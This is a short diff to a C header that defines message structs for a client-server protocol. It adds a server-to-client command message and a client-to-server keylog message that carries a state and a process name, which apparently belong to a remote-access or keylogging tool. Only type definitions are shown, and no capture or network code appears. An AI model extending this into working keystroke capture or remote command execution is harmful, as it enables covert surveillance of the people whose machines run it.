@@ -5,7 +5,8 @@
 enum protocol {
 	HELLO = 0,
 	MESSAGE,
-	COMMAND
+	COMMAND,
+	KEYLOG
 };
 
 // Client -> Server
@@ -16,7 +17,19 @@ typedef struct PDUHello {
 
 // Server -> Client
 typedef struct PDUMessage {
-	UCHAR protocol_type; // MESSAGE
+	char protocol_type; // MESSAGE
 	WCHAR message[600];
 } PDUMessage;
 
+// Server -> Client
+typedef struct PDUCommand {
+	char protocol_type; // MESSAGE, COMMAND
+	WCHAR command[110];
+} PDUCommand;
+
+// Client -> Server
+typedef struct PDUKeylog {
+	char protocol_type; // KEYLOG
+	char state;
+	WCHAR process_name[70];
+} PDUKeylog;
